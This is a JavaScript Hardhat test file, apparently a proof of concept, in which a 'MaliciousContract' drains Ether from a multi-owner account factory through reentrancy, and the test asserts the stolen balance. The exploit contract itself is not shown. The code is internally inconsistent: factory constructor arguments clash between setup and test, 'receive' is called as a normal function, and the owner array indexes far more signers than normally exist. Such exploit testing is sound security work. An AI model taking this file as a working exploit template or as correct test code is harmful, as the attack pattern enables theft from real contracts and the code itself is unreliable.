const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("Reentrancy Attack Test", function () {
  let factory;
  let multiOwnerPlugin;
  let impl;
  let entryPoint;
  let owner1, owner2, notOwner, badImpl;
  let owners;
  let largeOwners = [];

  before(async function () {
    // Set up accounts
    const accounts = await ethers.getSigners();
    notOwner = accounts[0];
    owner1 = accounts[1];
    owner2 = accounts[2];
    badImpl = accounts[3];

    // Deploy EntryPoint mock
    const EntryPointMock = await ethers.getContractFactory("EntryPointMock");
    entryPoint = await EntryPointMock.deploy();
    await entryPoint.deployed();

    // Deploy MultiOwnerPlugin mock
    const MultiOwnerPluginMock = await ethers.getContractFactory(
      "MultiOwnerPluginMock"
    );
    multiOwnerPlugin = await MultiOwnerPluginMock.deploy();
    await multiOwnerPlugin.deployed();

    // Deploy implementation mock
    const UpgradeableModularAccountMock = await ethers.getContractFactory(
      "UpgradeableModularAccountMock"
    );
    impl = await UpgradeableModularAccountMock.deploy(entryPoint.address);
    await impl.deployed();

    // Create dummy manifest hash
    const manifestHash = ethers.utils.keccak256(
      ethers.utils.toUtf8Bytes("dummy manifest")
    );

    // Deploy the factory
    const MultiOwnerModularAccountFactory = await ethers.getContractFactory(
      "MultiOwnerModularAccountFactory"
    );
    factory = await MultiOwnerModularAccountFactory.deploy(
      owner1.address,
      multiOwnerPlugin.address,
      impl.address,
      manifestHash,
      entryPoint.address
    );
    await factory.deployed();

    // Set up owners array
    owners = [owner1.address, owner2.address];

    // Set up large owners array for testing
    for (let i = 0; i < 100; i++) {
      largeOwners.push(accounts[i + 4].address);
    }

    // Fund the factory with some Ether for testing
    await owner1.sendTransaction({
      to: factory.address,
      value: ethers.utils.parseEther("10")
    });
  });

  it("Should drain funds from the factory via reentrancy", async function () {
    const Factory = await ethers.getContractFactory(
      "MultiOwnerModularAccountFactory"
    );

    // get list of accounts
    const accounts = await ethers.getSigners();
    const owner1 = accounts[0];

    const factory = await Factory.deploy();
    await factory.deployed();

    // Sending Ether to the factory
    await factory.receive({ value: ethers.utils.parseEther("10") });

    const Malicious = await ethers.getContractFactory("MaliciousContract");
    const malicious = await Malicious.deploy(factory.address);
    await malicious.deployed();

    // Attacking the factory
    await malicious.attack({ value: ethers.utils.parseEther("1") });

    // Checking the balances after the attack
    const factoryBalance = await ethers.provider.getBalance(factory.address);
    const maliciousBalance = await malicious.getBalance();
    console.log(
      `Factory balance after attack: ${ethers.utils.formatEther(
        factoryBalance
      )} ETH`
    );
    console.log(
      `Malicious contract balance after attack: ${ethers.utils.formatEther(
        maliciousBalance
      )} ETH`
    );

    expect(factoryBalance).to.be.below(ethers.utils.parseEther("9"));
    expect(maliciousBalance).to.be.above(ethers.utils.parseEther("1"));
  });
});
